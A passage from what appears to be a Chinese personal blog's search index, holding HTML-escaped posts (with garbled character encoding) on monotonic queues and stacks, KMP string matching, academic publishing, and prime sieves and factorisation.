     for i &amp;gt;=0 &amp;amp;&amp;amp; i &amp;lt; len(matrix) &amp;amp;&amp;amp; j &amp;gt;= 0 &amp;amp;&amp;amp; j &amp;lt; len(matrix[0]) {
         if matrix[i][j] &amp;gt; target {
             j --
         } else if matrix[i][j] &amp;lt; target {
             i ++
         } else {
             return true
         }
     }
     return false
}
&lt;/code&gt;&lt;/pre&gt;
">ã€ç®—æ³•ã€‘æŸ¥æ‰¾</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/dui-lie-dan-diao-dui-lie/"" data-c="
          &lt;p&gt;å•è°ƒé˜Ÿåˆ—å’Œå•è°ƒæ ˆæœ‰äº›ç±»ä¼¼ï¼Œå®ƒä»¬çš„ç”¨é€”ååˆ†æœ‰é™ï¼Œä½†ç”±äºç®—æ³•å·§å¦™ä¼˜ç¾ï¼Œæ‰€ä»¥ååˆ†å—é¢è¯•å®˜çš„é’çã€‚&lt;/p&gt;
&lt;p&gt;å•è°ƒé˜Ÿåˆ—ä¸»è¦ç”¨åœ¨æ±‚æ»‘åŠ¨åŒºé—´å†…æœ€å€¼ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹é¢˜ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627111710802.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627111714662.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;vector&amp;gt;

using namespace std;

const int N = 1e6 + 10;

int main()
{
    int n, k;
    vector&amp;lt;int&amp;gt; q; // ç”¨ä¸€ä¸ªvectoræ¨¡æ‹Ÿä¸€ä¸ªé˜Ÿåˆ—ï¼Œé˜Ÿåˆ—ä¸­å­˜å‚¨çš„æ˜¯æ•°çš„ä¸‹æ ‡
    
    scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;k);

    int arr[N];
    
    for(int i = 0; i &amp;lt; n; i++)
    {
        scanf(&amp;quot;%d&amp;quot;, &amp;amp;arr[i]);
    }
    
    
    // æ±‚æ»‘åŠ¨çª—å£ä¸­çš„æœ€å°å€¼
    for(int i = 0; i &amp;lt; n; i ++ )
    {
        // å¦‚æœé˜Ÿåˆ—æœ€å°å€¼å·²ç»ä¸å†æ»‘åŠ¨çª—å£å†…ï¼Œå°†å…¶åˆ é™¤
        if(!q.empty() &amp;amp;&amp;amp; q.front() &amp;lt; i - k + 1) 
            q.erase(q.begin());
        // å¦‚æœæ–°è¿›æ¥çš„å€¼æ¯”é˜Ÿåˆ—ä¸­çš„æœ€å°å€¼è¿˜è¦å°ï¼Œé‚£ä¹ˆå°†é˜Ÿåˆ—ä¸­å¤§äºå½“å‰å€¼çš„æ•°åˆ é™¤
        while(!q.empty() &amp;amp;&amp;amp; arr[q.back()] &amp;gt;= arr[i]) 
            q.pop_back();
        q.push_back(i);
        if(i &amp;gt;= k - 1) printf(&amp;quot;%d &amp;quot;, arr[q.front()]);
    }
    // è¿™ä¸ªè¿‡ç¨‹ä¸‹æ¥é˜Ÿåˆ—ä¸­çš„æ•°å§‹ç»ˆä¿æŒäº†æœ‰åº
    
    cout&amp;lt;&amp;lt;endl;
    
    q.clear();
    
    
    // æ±‚æœ€å¤§å€¼æ˜¯ç±»ä¼¼çš„è¿‡ç¨‹
    for(int i = 0; i &amp;lt; n; i ++ )
    {
        if(!q.empty() &amp;amp;&amp;amp; q.front() &amp;lt; i - k + 1) 
            q.erase(q.begin());
        while(!q.empty() &amp;amp;&amp;amp; arr[q.back()] &amp;lt;= arr[i])
            q.pop_back();
        q.push_back(i);
        if(i &amp;gt;= k - 1) printf(&amp;quot;%d &amp;quot;, arr[q.front()]);
    }
    
    return 0;
    
}
&lt;/code&gt;&lt;/pre&gt;
">ã€æ•°æ®ç»“æ„ã€‘ã€é˜Ÿåˆ—ã€‘å•è°ƒé˜Ÿåˆ—</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/zhan-dan-diao-zhan/"" data-c="
          &lt;p&gt;å•è°ƒæ ˆå°±æ˜¯åœ¨æ ˆçš„åŸºç¡€ä¸Šä¿æŒäº†æ•°çš„æœ‰åºã€‚&lt;/p&gt;
&lt;p&gt;æœ€å¸¸è§çš„åº”ç”¨æ˜¯ç”¨æ¥æ±‚ä¸€ä¸ªåºåˆ—/æ•°ç»„ä¸­ï¼Œæ¯ä¸ªæ•°çš„å·¦è¾¹/å³è¾¹ç¬¬ä¸€ä¸ªæ¯”å…¶å°/å¤§çš„æ•°çš„ä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚æ‰¾ä¸€ä¸ªæ•°ç»„ä¸­æ¯ä¸€ä¸ªæ•°çš„å‰é¢æœ€è¿‘çš„æ¯”å…¶å°çš„æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;4, 6, 8, 7, 5&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆç»´æŠ¤ä¸€ä¸ªæ ˆ&lt;code&gt;stk&lt;/code&gt;ï¼Œä»å‰å¾€åæ‰¾æ¯ä¸ªæ•°çš„ç­”æ¡ˆï¼Œåœ¨æ‰¾&lt;code&gt;7&lt;/code&gt;è¿™ä¸ªæ•°çš„æ—¶å€™ï¼Œæ­¤æ—¶æ ˆä¸­å·²ç»ä¿å­˜äº†&lt;code&gt;4, 6, 8&lt;/code&gt;è¿™ä¸‰ä¸ªæ•°äº†ï¼Œé¦–å…ˆæ¯”è¾ƒæ ˆé¡¶å…ƒç´ &lt;code&gt;8&lt;/code&gt;ï¼Œå¤§äº&lt;code&gt;7&lt;/code&gt;ï¼Œå¼¹æ ˆï¼Œä»¥å&lt;code&gt;8&lt;/code&gt;ä¸ä¼šå†æ˜¯&lt;code&gt;7&lt;/code&gt;åé¢çš„ä»»æ„ä¸€ä¸ªæ•°çš„ç­”æ¡ˆï¼Œå› ä¸º&lt;code&gt;7&amp;lt;8&lt;/code&gt;ï¼Œè€Œä¸”&lt;code&gt;7&lt;/code&gt;è·ç¦»å®ƒä»¬æ›´è¿‘ã€‚ç„¶åæ¯”è¾ƒä¸‹ä¸€ä¸ªæ•°&lt;code&gt;6&amp;lt;7&lt;/code&gt;ï¼Œå³&lt;code&gt;7&lt;/code&gt;çš„ç­”æ¡ˆæ˜¯&lt;code&gt;6&lt;/code&gt;ï¼Œç„¶åå°†&lt;code&gt;7&lt;/code&gt;å…¥æ ˆä¾›åé¢çš„æ•°æ¯”è¾ƒã€‚&lt;/p&gt;
&lt;p&gt;åŸºäºæ­¤ï¼Œåœ¨æ‰¾åé¢æ•°çš„ç­”æ¡ˆçš„æ—¶å€™å°±ä¸éœ€è¦å†ä¸&lt;code&gt;8&lt;/code&gt;è¿›è¡Œæ¯”è¾ƒäº†ï¼Œå¦‚æœæ•°æ®é‡æ¯”è¾ƒå¤§(ä¾‹å¦‚&lt;code&gt;4, 6, 8, 8, 8, 8, 8, ..., 8, 7, 5, ...&lt;/code&gt;ï¼Œ&lt;code&gt;7&lt;/code&gt;çš„åé¢çš„æ•°ä¸ä¼šå†ä¸&lt;code&gt;8&lt;/code&gt;è¿›è¡Œæ¯”è¾ƒ)ï¼Œå°†ä¼šèŠ‚çœå¾ˆå¤§ä¸€éƒ¨åˆ†æ—¶é—´ã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤å¯ä»¥å‘ç°æ ˆ&lt;code&gt;stk&lt;/code&gt;ä¸­çš„æ¯ä¸ªæ•°æ˜¯ä¸¥æ ¼æŒ‰ç…§é€’å¢çš„é¡ºåºçš„ï¼Œæ‰€ä»¥ç§°ä¸ºå•è°ƒæ ˆã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// æ±‚å³è¾¹ç¬¬ä¸€ä¸ªæ¯”å…¶å¤§çš„æ•°
vector&amp;lt;int&amp;gt; ans(T.size(), 0);
stack&amp;lt;int&amp;gt; s;
for(int i = 0; i &amp;lt; T.size(); i ++ )
{
    while(!s.empty() &amp;amp;&amp;amp; T[s.top()] &amp;lt; T[i])
    {
        ans[s.top()] = i - s.top();
        s.pop();
    }
    s.push(i);
}

// æ±‚å³è¾¹ç¬¬ä¸€ä¸ªæ¯”å…¶å°çš„æ•°
vector&amp;lt;int&amp;gt; ans(T.size(), 0);
stack&amp;lt;int&amp;gt; s;
for(int i = 0; i &amp;lt; T.size(); i ++ )
{
    while(!s.empty() &amp;amp;&amp;amp; T[s.top()] &amp;gt; T[i])
    {
        ans[s.top()] = i - s.top();
        s.pop();
    }
    s.push(i);
}

// æ±‚å·¦è¾¹ç¬¬ä¸€ä¸ªæ¯”å…¶å¤§çš„æ•°
vector&amp;lt;int&amp;gt; ans(T.size(), 0);
stack&amp;lt;int&amp;gt; s;
for(int i = T.size() - 1; i &amp;gt;= 0; i -- )
{
    while(!s.empty() &amp;amp;&amp;amp; T[s.top()] &amp;lt; T[i])
    {
        ans[s.top()] = i - s.top();
        s.pop();
    }
    s.push(i);
}

// æ±‚å·¦è¾¹ç¬¬ä¸€ä¸ªæ¯”å…¶å°çš„æ•°
vector&amp;lt;int&amp;gt; ans(T.size(), 0);
stack&amp;lt;int&amp;gt; s;
for(int i = T.size() - 1; i &amp;gt;= 0; i -- )
{
    while(!s.empty() &amp;amp;&amp;amp; T[s.top()] &amp;gt; T[i])
    {
        ans[s.top()] = i - s.top();
        s.pop();
    }
    s.push(i);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;å‚è€ƒé¢˜ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;https://www.acwing.com/video/258/&lt;br&gt;
https://leetcode-cn.com/problems/daily-temperatures/&lt;br&gt;
https://leetcode-cn.com/problems/next-greater-element-i/&lt;br&gt;
https://leetcode-cn.com/problems/maximum-subarray-min-product/&lt;/p&gt;
">ã€æ•°æ®ç»“æ„ã€‘ã€æ ˆã€‘å•è°ƒæ ˆ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/kmp-suan-fa-dai-ma/"" data-c="
          &lt;p&gt;é—®é¢˜ï¼šåœ¨ä¸€ä¸ªå­—ä¸²ä¸­æ˜¯å¦å‡ºç°è¿‡å¦ä¸€ä¸ªå­—ä¸²ã€‚&lt;/p&gt;
&lt;p&gt;KMPç®—æ³•çš„æ ¸å¿ƒæ˜¯æ‰¾æœ€é•¿å…¬å…±å‰åç¼€ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒåˆ°ç¬¬&lt;code&gt;i&lt;/code&gt;ä¸ªå­—ç¬¦ä¸²æ—¶ä¸ç›¸ç­‰äº†ï¼Œé‚£ä¹ˆæ¨¡å¼ä¸²æŒ‡é’ˆå°†ä¼šç§»åŠ¨åˆ°è¯¥ä¸ç›¸ç­‰å­—ç¬¦çš„å‰é¢å­å­—ç¬¦ä¸²çš„æœ€é•¿å…¬å…±å‰ç¼€å­ä¸²çš„åä¸€ä¸ªå­—ç¬¦ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¾‹å¦‚ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¾…åŒ¹é…å­—ç¬¦ä¸²ï¼šS=&lt;code&gt;abdabababac&lt;/code&gt;&lt;br&gt;
å’Œæ¨¡å¼å­—ç¬¦ä¸²ï¼šP=&lt;code&gt;abdabc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å½“ä¸¤ä¸ªå­—ç¬¦ä¸²ä»å¤´è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œæ¯”è¾ƒåˆ°ä¸‹æ ‡ä¸º&lt;code&gt;5&lt;/code&gt;çš„ä½ç½®æ—¶&lt;code&gt;S[i]=&#39;a&#39;&lt;/code&gt;ä¸&lt;code&gt;P[j]=&#39;c&#39;&lt;/code&gt;ä¸ç›¸ç­‰ï¼Œæ­¤æ—¶åº”è¯¥ç§»åŠ¨æ¨¡å¼ä¸²æŒ‡é’ˆjåˆ°&lt;code&gt;c&lt;/code&gt;çš„å‰é¢å­ç¬¦ä¸²&lt;code&gt;abdab&lt;/code&gt;çš„æœ€é•¿å…¬å…±å‰åç¼€å­ä¸²(&lt;code&gt;abdab&lt;/code&gt;çš„æœ€é•¿å…¬å…±å‰åç¼€ä¸º&lt;code&gt;ab&lt;/code&gt;)çš„åä¸€ä¸ªå­—ç¬¦&lt;code&gt;P[3]=&#39;d&#39;&lt;/code&gt;å¤„è¿›è¡Œä¸‹é¢çš„æ¯”è¾ƒã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1635855760559.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å‰ç¼€è¡¨ï¼šè¡¨ç¤ºæ¨¡å¼ä¸²å‰iä¸ªå­ä¸²çš„æœ€é•¿å…¬å…±å‰åç¼€çš„é•¿åº¦ï¼Œä¾‹å¦‚aabaafï¼Œpre[0]=0ï¼Œpre[1]=1ï¼Œpre[2]=0ï¼Œpre[3]=1ï¼Œpre[4]=2ï¼Œpre[5]=0ã€‚&lt;/p&gt;
&lt;p&gt;nextæ•°ç»„å¯ä»¥æ˜¯å‰ç¼€è¡¨ï¼Œä¸€èˆ¬éƒ½æ˜¯å‰ç¼€è¡¨ç»Ÿä¸€å‡ä¸€ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;

#define N 100010
#define M 1000010

using namespace std;

int main()
{
    int n, m;
    char P[N], S[M];
    int next[N];
    next[0] = -1;
    
    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; P &amp;gt;&amp;gt; m &amp;gt;&amp;gt; S ;
    
    // è®¡ç®—nextæ•°ç»„
    // next[i] è¡¨ç¤º iï¼ˆåŒ…æ‹¬iï¼‰ä¹‹å‰æœ€é•¿ç›¸ç­‰çš„å‰åç¼€é•¿åº¦-1ï¼ˆå…¶å®å°±æ˜¯jï¼‰
    // jæŒ‡å‘å‰ç¼€èµ·å§‹ä½ç½®ï¼ŒiæŒ‡å‘åç¼€èµ·å§‹ä½ç½®
    // aabaaf
    // aabaaf
    for (int i = 1, j = -1; i &amp;lt; n; i ++ )
    {
        while (j != -1 &amp;amp;&amp;amp; P[i] != P[j + 1])
            j = next[j]; // å‘å‰å›é€€
        if (P[i] == P[j + 1])
            j++;
        next[i] = j; 
        // next[0]=-1
        // i=1 j=1 next[1]=0
        // i=2 j=-1 next[2]=-1
        // i=3 j=
    }
    
    // åŒ¹é…
    for (int i = 0, j = -1; i &amp;lt; m; i ++)
    {
        while (j!=-1 &amp;amp;&amp;amp; S[i] != P[j + 1])
            j = next[j];
        if (S[i] == P[j + 1])
            j++;
        if (j == n-1)
        {
            cout &amp;lt;&amp;lt; i - n + 1 &amp;lt;&amp;lt; &amp;quot; &amp;quot;;
            j = next[j];
        }
    }

    // return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¾‹é¢˜ï¼šhttps://leetcode-cn.com/problems/implement-strstr/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int strStr(string haystack, string needle) {
        if(needle == &amp;quot;&amp;quot;) return 0;
        int next[50010];
        next[0] = -1;
        for (int i = 1, j = -1; i &amp;lt; needle.length(); i ++) {
            while (j != -1 &amp;amp;&amp;amp; needle[i] != needle[j + 1]) {
                j = next[j];
            }
            if (needle[i] == needle[j + 1]) {
                j ++;
            }
            next[i] = j;
        }

        for (int i = 0, j = -1; i &amp;lt; haystack.length(); i ++) {
            while (j != -1 &amp;amp;&amp;amp; haystack[i] != needle[j + 1]) {
                j = next[j];
            }
            if (haystack[i] == needle[j + 1]) {
                j ++;
            }
            if (j == needle.length() - 1) {
                return i - needle.length() + 1;
            }
        }
        return -1;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™&lt;br&gt;
https://www.bilibili.com/video/BV1PD4y1o7nd&lt;br&gt;
https://www.acwing.com/problem/content/description/833/&lt;br&gt;
https://www.acwing.com/video/259/&lt;/p&gt;
">ã€ç®—æ³•ã€‘KMPç®—æ³•ä»£ç </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/qi-kan-hui-yi-chu-ban-shang-zuo-zhe-zhi-jian-de-guan-xi/"" data-c="
          &lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640691839497.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;ç ”ç©¶äººå‘˜å‘æœŸåˆŠæˆ–è€…ä¼šè®®æŠ•ç¨¿ï¼Œäº¤æ³¨å†Œè´¹å’Œç›¸åº”çš„å®¡ç¨¿è´¹ç­‰ç›¸å…³è´¹ç”¨ï¼›&lt;/li&gt;
&lt;li&gt;ä¼šè®®ç»„ç»‡è€…å’ŒæœŸåˆŠè”ç³»å‡ºç‰ˆç¤¾ï¼Œäº¤å‡ºç‰ˆè´¹ç”¨ï¼›&lt;/li&gt;
&lt;li&gt;å‡ºç‰ˆç¤¾å°†è®ºæ–‡æ›´æ–°åˆ°è‡ªå·±çš„æ•°æ®åº“ä¸­ï¼Œç„¶åå°†æ•°æ®åº“å–ç»™å…¨ä¸–ç•Œå„å¤§é«˜æ ¡æˆ–ä¼ä¸šï¼›&lt;/li&gt;
&lt;li&gt;å…¶ä»–å¼€æºæ•°æ®åº“æŠ“å–å‡ºç‰ˆç¤¾æ•°æ®åº“çš„è®ºæ–‡é¢˜ç›®ã€æ‘˜è¦ã€å‚è€ƒæ–‡çŒ®ç­‰ä¿¡æ¯ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;ä¼šè®®ç»„ç»‡è€…ï¼š&lt;/strong&gt; ä¸€èˆ¬ç”±æŸä¸ªå­¦æ ¡ã€ç»„ç»‡ï¼Œä¸ºäº†å­¦æœ¯/åˆ©ç›Šä¸¾åŠä¼šè®®ï¼Œè´Ÿè´£å¾é›†ç§‘ç ”å·¥ä½œè€…çš„è®ºæ–‡å¹¶å†³å®šæ˜¯å¦å½•ç”¨ï¼Œç„¶åè”ç³»å‡ºç‰ˆç¤¾è¿›è¡Œå‡ºç‰ˆå‘è¡¨ï¼Œå› æ­¤è¦å¾æ”¶ç§‘ç ”å·¥ä½œè€…ç›¸åº”çš„è´¹ç”¨ï¼ŒåŒæ—¶éœ€è¦å‘å‡ºç‰ˆç¤¾äº¤ç›¸åº”çš„å‡ºç‰ˆè´¹ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æœŸåˆŠï¼š&lt;/strong&gt; æœŸåˆŠè®ºæ–‡æ˜¯ç§‘ç ”å·¥ä½œè€…é’ˆå¯¹æŸå­¦æœ¯æœŸåˆŠæŠ•ç¨¿ï¼Œå®¡ç¨¿ä¸“å®¶å®¡ç¨¿å¹¶è¿”å›ä¿®æ”¹æ„è§ï¼Œæœ€ç»ˆç”±æœŸåˆŠç¼–è¾‘éƒ¨å†³å®šæ˜¯å¦å½•ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å‡ºç‰ˆç¤¾ï¼š&lt;/strong&gt; ä¸€èˆ¬å…·æœ‰ä¸€å®šå£°æœ›ï¼ŒåƒIEEEã€Springerã€ACMï¼Œå®ƒä»¬æ——ä¸‹æœ‰ä¸€äº›ä¼šè®®ã€æœŸåˆŠï¼Œå‘ä¼šè®®æœŸåˆŠæ”¶å–å‡ºç‰ˆè´¹ï¼Œæ‹¿å–ç‰ˆæƒï¼Œæ‰©å……è‡ªå·±çš„æ•°æ®åº“ï¼Œå‘å…¶ä»–ä¼ä¸šã€é«˜æ ¡å‡ºå”®æ¥ç›ˆåˆ©ã€‚å…¶å®æœ‰çš„å‡ºç‰ˆç¤¾å³ç»„ç»‡å­¦æœ¯ä¼šè®®ï¼Œä¹Ÿå‡ºç‰ˆå­¦æœ¯æœŸåˆŠï¼Œæ¯”å¦‚IEEEã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å‡ºç‰ˆç¤¾æ•°æ®åº“ï¼š&lt;/strong&gt; å‡ºç‰ˆç¤¾é€šå¸¸ç»´æŠ¤è‡ªå·±çš„æ•°æ®åº“ï¼Œæ¯”å¦‚IEEEçš„IEEE Xploreå°±æ˜¯æŸ¥è¯¢è¯¥å‡ºç‰ˆç¤¾æ•°æ®åº“çš„å…¥å£ï¼Œè¿™äº›æ•°æ®åº“éƒ½æ˜¯å¯ä»¥ä¸‹è½½åˆ°åŸæ–‡ç« çš„ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IEEEï¼šhttps://ieeexplore.ieee.org/&lt;/li&gt;
&lt;li&gt;Springerï¼šhttps://link.springer.com/&lt;/li&gt;
&lt;li&gt;Elsevierï¼šhttps://www.elsevier.com/solutions/sciencedirect&lt;/li&gt;
&lt;li&gt;Taylor &amp;amp; Francisï¼šhttps://www.tandfonline.com/ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ç´¢å¼•æ•°æ®åº“ï¼š&lt;/strong&gt; åƒSCIã€EIã€CPCI-Sç­‰è¿™äº›æ•°æ®åº“å…¶å®æ²¡æœ‰è®ºæ–‡çš„ç‰ˆæƒï¼Œä¸å…¶è¯´æ•°æ®åº“ä¸å¦‚è¯´æ˜¯ä¸€ä¸ªæ£€ç´¢å·¥å…·ï¼Œç±»ä¼¼google/google scholarï¼Œå¯ä»¥ç»¼åˆæ£€ç´¢åˆ°å„å¤§å‡ºç‰ˆç¤¾çš„æ•°æ®åº“ä¸­çš„æ–‡çŒ®ï¼Œä½†åªèƒ½åœ¨è¿™ä¸Šé¢æ£€ç´¢åˆ°è®ºæ–‡çš„é¢˜ç›®ï¼Œæ‘˜è¦ï¼Œå‚è€ƒæ–‡çŒ®ç­‰ï¼Œå’Œå®ƒä»¬è‡ªå·±å¯ä»¥ä¼šæœ‰ä¸€ä¸ªåˆ†ç±»ï¼Œæ·»åŠ ä¸€äº›é™„åŠ ä¿¡æ¯ï¼Œæ¯”å¦‚å½±å“å› å­ç­‰ã€‚æ¯”å¦‚SCIåªæ”¶å½•ä¸€äº›é«˜è´¨é‡çš„æ–‡ç« ï¼Œè€ŒEIå¯èƒ½å°±æ”¶å½•çš„ä¼šå¤šä¸€äº›ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SCIç§‘å­¦å¼•æ–‡ç´¢å¼•(web of science)ï¼šhttp://webofknowledge.com&lt;/li&gt;
&lt;li&gt;EIå·¥ç¨‹ç´¢å¼•ï¼šhttps://www.engineeringvillage.com&lt;/li&gt;
&lt;li&gt;ISTPç§‘æŠ€ä¼šè®®å½•ç´¢å¼•ï¼šhttp://webofknowledge.com&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640691854502.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640691860761.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">æœŸåˆŠã€ä¼šè®®ã€å‡ºç‰ˆå•†ã€ä½œè€…ä¹‹é—´çš„å…³ç³»</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-shu-xue/"" data-c="
          &lt;h2 id=&#34;è´¨æ•°&#34;&gt;è´¨æ•°&lt;/h2&gt;
&lt;h3 id=&#34;çº¿æ€§ç­›é€‰è´¨æ•°&#34;&gt;çº¿æ€§ç­›é€‰è´¨æ•°ï¼š&lt;/h3&gt;
&lt;p&gt;å‡ºç°ä¸€ä¸ªæ•°ï¼Œåˆ™æŠŠå·²è¿™ä¸ªæ•°ä¸ºå› å­çš„æ•°éƒ½æ ‡è®°ä¸ºåˆæ•°ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¦‚2ï¼Œæ‰€ä»¥4,6,8 10....éƒ½æ ‡è®°ä¸ºåˆæ•°&lt;/li&gt;
&lt;li&gt;å¦‚3ï¼Œæ‰€ä»¥9,12,15.....éƒ½æ ‡è®°ä¸ºåˆæ•°&lt;/li&gt;
&lt;li&gt;å¦‚4ï¼Œæ‰€ä»¥16,20,24...éƒ½æ ‡è®°ä¸ºåˆæ•°&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å³ï¼Œè‹¥iæ˜¯ç´ æ•°ï¼Œåˆ™ä» j=i*i å¼€å§‹ï¼ŒæŠŠ j+i , j+2i , j+3i .....éƒ½æ ‡è®°ä¸ºåˆæ•° ï¼ˆå› ä¸º2*i, 3*i, 4*i, ...., (i-1)*i åˆ†åˆ«æ˜¯2, 3, 4, ..., i-1çš„å€æ•°ï¼Œå·²ç»åœ¨iä¹‹å‰æ ‡è®°è¿‡ï¼Œæ‰€ä»¥ä»j=i*iå¼€å§‹æ ‡è®°ï¼‰&lt;/p&gt;
&lt;p&gt;ç­›æ³•çš„æ€æƒ³æ˜¯å»é™¤è¦æ±‚èŒƒå›´å†…æ‰€æœ‰çš„åˆæ•°ï¼Œå‰©ä¸‹çš„å°±æ˜¯ç´ æ•°äº†ï¼Œè€Œä»»ä½•åˆæ•°éƒ½å¯ä»¥è¡¨ç¤ºä¸ºç´ æ•°çš„ä¹˜ç§¯ï¼Œå› æ­¤å¦‚æœå·²çŸ¥ä¸€ä¸ªæ•°ä¸ºç´ æ•°ï¼Œåˆ™å®ƒçš„å€æ•°éƒ½ä¸ºåˆæ•°ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;const int N = 1e5;
int prime[N] = {0};
for(int i = 2; i &amp;lt;= sqrt(N + 1); i++)
{
    if(!prime[i])
    {
        for(int j = i + 1; j &amp;lt;= N; j += i)
            prime[j] = 1;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;åˆ†è§£è´¨å› æ•°&#34;&gt;åˆ†è§£è´¨å› æ•°&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void primeFactor(int n)
{
    int x = sqrt(n) + 1;
    for(int i=2; i&amp;lt;x; i++)
    {
        int cnt = 0; // cntè¡¨ç¤ºè¯¥è´¨å› æ•°çš„å¹‚æ¬¡
        while(n % i == 0) //è¾“å‡ºæ‰€æœ‰å¯ä»¥çº¦å»çš„æ•°
        {
            cnt ++;
            n /= i;
        }
        if(cnt) cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; cnt &amp;lt;&amp;lt; endl;
    }
    if(x &amp;gt; 1) cout &amp;lt;&amp;lt; x &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; 1 &amp;lt;&amp;lt; endl;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸€ä¸ªè‡ªç„¶æ•°çš„çº¦æ•°ä¸ªæ•°æ˜¯å®ƒå„è´¨å› æ•°çš„æ¬¡æ•°åˆ†åˆ«åŠ 1ç›¸ä¹˜çš„ç§¯ã€‚&lt;br&gt;
ä¾‹ï¼š18çš„å› æ•°æœ‰ï¼š1ï¼Œ2ï¼Œ3ï¼Œ6ï¼Œ9ï¼Œ18ã€‚è€Œå…¶è´¨å› æ•°æœ‰18=2Ã—2Ã—3ã€‚&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1601271024765.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å³(1+1) * (2+1)=6ä¸ªã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ¬§æ‹‰å‡½æ•°&#34;&gt;æ¬§æ‹‰å‡½æ•°&lt;/h3&gt;
&lt;p&gt;https://www.acwing.com/problem/content/875/&lt;/p&gt;
&lt;p&gt;æ¬§æ‹‰å‡½æ•°çš„å®šä¹‰ï¼š1~Nä¸­ä¸Näº’è´¨çš„æ•°çš„ä¸ªæ•°è¢«ç§°ä¸ºæ¬§æ‹‰å‡½æ•°ï¼Œè®°ä¸ºÏ†(n)&lt;/p&gt;
